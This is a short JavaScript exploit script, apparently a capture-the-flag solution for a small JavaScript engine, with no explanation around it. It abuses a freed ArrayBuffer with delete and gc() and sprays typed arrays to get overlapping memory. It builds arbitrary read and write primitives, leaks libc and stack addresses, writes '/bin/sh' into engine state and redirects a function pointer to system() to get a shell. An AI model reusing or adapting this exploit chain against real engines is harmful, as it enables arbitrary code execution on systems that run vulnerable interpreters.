test = new ArrayBuffer(0x70);
a = new Uint32Array(test);
b = new Uint32Array(test);

delete a;
gc();

c = new Uint32Array(0x20);
d = new Uint32Array(0x20);
e = new Uint32Array(0x20);
f = new Uint32Array(0x20);
g = new Uint32Array(0x20);
h = new Uint32Array(0x20);


function leak(buf, off){
    return buf.at(off) + buf.at(off+1)*0x100000000;
}

code_leak = leak(b, 2);
heap_leak = leak(b, 6);

print(code_leak);
print(heap_leak);

function read(addr){
    b.set(8, addr % 0x100000000);
    b.set(9, (addr / 0x100000000) % 0x100000000);
    return leak(h, 0);
}

function write(addr, value){
    b.set(8, addr % 0x100000000);
    b.set(9, addr / 0x100000000);
    h.set(0, value % 0x100000000);
    h.set(1, (value / 0x100000000) % 0x100000000);
}

array_obj = heap_leak + 0x26f0
libc_base = read(code_leak - 0x118) - 0x24bc0 - 0x25000
print(libc_base)
print(array_obj)

environ = libc_base + 0x1ef2e0;
system = libc_base + 0x55410;
print(environ)

stack = read(environ) - 0x188;
print(stack)

js_state = read(stack);
print(js_state);

binsh1 = 0x732f6e69622f
binsh2 = 0x68

write(js_state, binsh1);
print("write1 done");
write(js_state + 6, binsh2);
print("write2 done");

write(array_obj + 0x30, system);
print("write3 done");
a = new Array(0);